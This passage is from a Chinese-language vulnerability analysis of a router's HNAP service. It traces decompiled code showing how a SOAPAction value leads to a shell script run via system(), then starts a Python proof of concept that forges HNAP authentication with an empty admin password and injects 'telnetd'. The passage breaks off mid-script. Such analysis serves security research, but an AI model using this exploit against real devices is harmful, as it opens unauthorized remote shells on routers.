&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iVar1 = -2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto LAB_004137fc;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">由</span><span class="cs9FB05234">HMAC</span><span class="cs7FFD2630">计算口令，以</span><span class="cs9FB05234">hmac_1</span><span class="cs7FFD2630">作为</span><span class="cs9FB05234">key,</span><span class="cs7FFD2630">对</span><span class="cs9FB05234">challenge</span><span class="cs7FFD2630">进行</span><span class="cs9FB05234">hmac</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HMAC_MD5(CHALLENGE,hmac_1,PWD);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">将计算的口令与发送方中的口令比较</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__fd = strcmp((char *)PWD,pwd);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (__fd == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login_response_xml(&quot;success&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}//end of action=login</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} //end of Login</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">不是</span><span class="cs9FB05234">login</span><span class="cs7FFD2630">的情况</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (hnap_auth != (char *)0x0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//hnap_auth</span><span class="cs7FFD2630">用空格分为两部分</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;auth_1 = strtok(hnap_auth,&quot; &quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;auth_2 = strtok((char *)0x0,&quot; &quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">将</span><span class="cs9FB05234">auth_2</span><span class="cs7FFD2630">和</span><span class="cs9FB05234">soapaction</span><span class="cs7FFD2630">连接起来</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(auth_2_soapaction,auth_2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcat(auth_2_soapaction,soapaction);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HMAC_MD5(auth_2_soapaction,hmac_1,HMAC_AUTH);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">比较</span><span class="cs9FB05234">auth_1</span><span class="cs7FFD2630">和计算后的值</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__fd = strcmp(auth_1,HMAC_AUTH);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (__fd == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">如果不是</span><span class="cs9FB05234">Logout</span><span class="cs7FFD2630">，就跳转到</span><span class="cs9FB05234">0x413330</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__format = strstr(soapaction,&quot;http://purenetworks.com/HNAP1/Logout&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (__format == (char *)0x0) goto LAB_00413330;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}//end of soapaction!=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;LAB_00413330:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">在</span><span class="cs9FB05234">soapaction</span><span class="cs7FFD2630">中查找最后一个</span><span class="cs9FB05234">&ldquo;/&rdquo;</span><span class="cs7FFD2630">之后的内容为</span><span class="cs9FB05234">operation</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__format = strrchr(soapaction,0x2f);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;operation = __format + 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (__format != (char *)0x0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sVar3 = strlen(operation);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (operation[sVar3 - 1] == &#39;\&quot;&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;operation[sVar3 - 1] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//hnap</span><span class="cs7FFD2630">相关的</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">都在</span><span class="cs9FB05234">/etc/templates/hnap</span><span class="cs7FFD2630">下</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(php_path,0x100,&quot;%s/%s.php&quot;,&quot;/etc/templates/hnap/&quot;,operation);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">判断与请求相关的</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">是否存在，</span><span class="cs9FB05234">0</span><span class="cs7FFD2630">为存在</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iVar1 = access(php_path,0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (iVar1 == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(acStack1708,0x100,&quot;%s%s.php\nShellPath=%s%s.sh\nPrivateKey=%s\n&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;/etc/templates/hnap/&quot;,operation,&amp;var_run,operation,&amp;DAT_00438344);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sobj_add_string(iVar4,acStack1708);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uVar2 = sobj_get_string();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">该函数会建立一个</span><span class="cs9FB05234">socket</span><span class="cs7FFD2630">并把上面的</span><span class="cs9FB05234">acStack1708</span><span class="cs7FFD2630">字符发送给</span><span class="cs9FB05234">socket</span><span class="cs7FFD2630">；这个</span><span class="cs9FB05234">socket</span><span class="cs7FFD2630">是与本地的</span><span class="cs9FB05234">xmldb_sock</span><span class="cs7FFD2630">建立的，理解为发送给本地以执行对应的</span><span class="cs9FB05234">php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xmldbc_ephp(0,0,uVar2,stdout);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(acStack1708,0x100,&quot;%s&quot;,operation);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iVar4 = FUN_004125c8(acStack1708,&quot;/etc/templates/hnap//.shell_action&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">这里无论如何都会为</span><span class="cs9FB05234">format</span><span class="cs7FFD2630">赋值，内容是执行一个</span><span class="cs9FB05234">sh</span><span class="cs7FFD2630">脚本的命令</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (iVar4 == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__format = &quot;sh %s%s.sh &gt; /dev/console&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__format = &quot;sh %s%s.sh &gt; /dev/console &amp;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">执行该脚本</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//var_run</span><span class="cs7FFD2630">变量对应的字符是</span><span class="cs9FB05234">&quot;/var/run/&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(acStack1708,0x100,__format,&amp;var_run,operation);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(acStack1708);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h4 class="cs868C439D">
			<a name="漏洞执行顺序"><span class="cs6EDCDAE2">漏洞执行顺序</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在上面的</span><span class="cs8926E06">hnap_main</span><span class="cs9C1B1871">代码中，代入本漏洞</span><span class="cs8926E06">SetRouterSettings</span><span class="cs9C1B1871">的情况，最后会执行</span><span class="cs9FB05234">sh /var/run/SetRouterSettings.sh</span><span class="cs9C1B1871">，这个脚本是动态生成的，在模拟固件并执行</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">成功之后查看内容（还没找到具体生成</span><span class="cs8926E06">sh</span><span class="cs9C1B1871">脚本的代码）</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/bin/sh</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;[$0]--&gt;RouterSettings Change&quot; &gt; /dev/console</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">event DBSAVE &gt; /dev/console</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service HTTP.WAN-1 start &gt; /dev/console #here</span><span class="cs7FFD2630">！！！</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xmldbc -s /runtime/hnap/dev_status &#39;&#39; &gt; /dev/console</span></p><p class="cs40DD2BC9"><span class="cs8926E06">HTTP.WAN-1</span><span class="cs9C1B1871">是一种服务，对应于</span><span class="cs8926E06">/etc/services/HTTP.WAN-1.php</span><span class="cs9C1B1871">，该服务会开启</span><span class="cs8926E06">IPT.WAN-1</span><span class="cs9C1B1871">服务</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include &quot;/etc/services/HTTP/httpsvcs.php&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fwrite(&quot;w&quot;,$START,&quot;#!/bin/sh\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fwrite(&quot;w&quot;, $STOP,&quot;#!/bin/sh\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fwrite(&quot;a&quot;,$START,&quot;service IPT.WAN-1 restart\n&quot;);#here!!!!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fwrite(&quot;a&quot;,$START,&quot;service STUNNEL restart\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">httpsetup(&quot;WAN-1&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">/etc/services/IPT.WAN-1.php</span><span class="cs9C1B1871">会执行之前所说的</span><span class="cs8926E06">iptables</span><span class="cs9C1B1871">命令</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include &quot;/htdocs/phplib/trace.php&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include &quot;/etc/services/IPTABLES/iptwan.php&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">IPTWAN_build_command(&quot;WAN-1&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import telnetlib</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from hashlib import md5</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import math</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">trans_5C = &quot;&quot;.join(chr(x ^ 0x5c) for x in xrange(256))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">trans_36 = &quot;&quot;.join(chr(x ^ 0x36) for x in xrange(256))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">blocksize = md5().block_size</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def hmac_md5(key, msg):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if len(key) &gt; blocksize:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key = md5(key).digest()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;key += chr(0) * (blocksize - len(key))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;o_key_pad = key.translate(trans_5C)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;i_key_pad = key.translate(trans_36)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return md5(o_key_pad + md5(i_key_pad + msg).digest())</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def HNAP_AUTH(SOAPAction, privateKey):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;b = math.floor(int(time.time())) % 2000000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;b = str(b)[:-2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;h = hmac_md5(privateKey, b + &#39;&quot;http://purenetworks.com/HNAP1/&#39; + SOAPAction + &#39;&quot;&#39;).hexdigest().upper()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return h + &quot; &quot; + b</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">输入</span><span class="cs9FB05234">IP</span><span class="cs7FFD2630">和</span><span class="cs9FB05234">admin</span><span class="cs7FFD2630">口令，通过读</span><span class="cs9FB05234">hnap_main</span><span class="cs7FFD2630">的二进制，理解初始状态</span><span class="cs9FB05234">admin</span><span class="cs7FFD2630">的口令为空（</span><span class="cs9FB05234">public_key_0</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">0</span><span class="cs7FFD2630">代表空值）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">IP = &#39;192.168.0.1&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">adminPw = &#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">command = &quot;telnetd&quot; # command injection id</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">headers = requests.utils.default_headers()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;User-Agent&quot;] = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;SOAPAction&quot;] = &#39;&quot;http://purenetworks.com/HNAP1/Login&quot;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Origin&quot;] = &quot;http://&quot; + IP</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Referer&quot;] = &quot;http://&quot; + IP + &quot;/info/Login.html&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Content-Type&quot;] = &quot;text/xml; charset=UTF-8&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;X-Requested-With&quot;] = &quot;XMLHttpRequest&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">构造一个</span><span class="cs9FB05234">action</span><span class="cs7FFD2630">为</span><span class="cs9FB05234">request</span><span class="cs7FFD2630">的请求发送给</span><span class="cs9FB05234">Login</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload = &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = requests.post(&#39;http://&#39;+IP+&#39;/HNAP1/&#39;, headers=headers, data=payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">data = r.text</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">通过获取的</span><span class="cs9FB05234">publickey</span><span class="cs7FFD2630">计算</span><span class="cs9FB05234">privatekey</span><span class="cs7FFD2630">，根据</span><span class="cs9FB05234">privatekey</span><span class="cs7FFD2630">计算口令的</span><span class="cs9FB05234">hmac(</span><span class="cs7FFD2630">在上文中对应的是</span><span class="cs9FB05234">hmac_1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">challenge = str(data[data.find(&quot;&lt;Challenge&gt;&quot;) + 11: 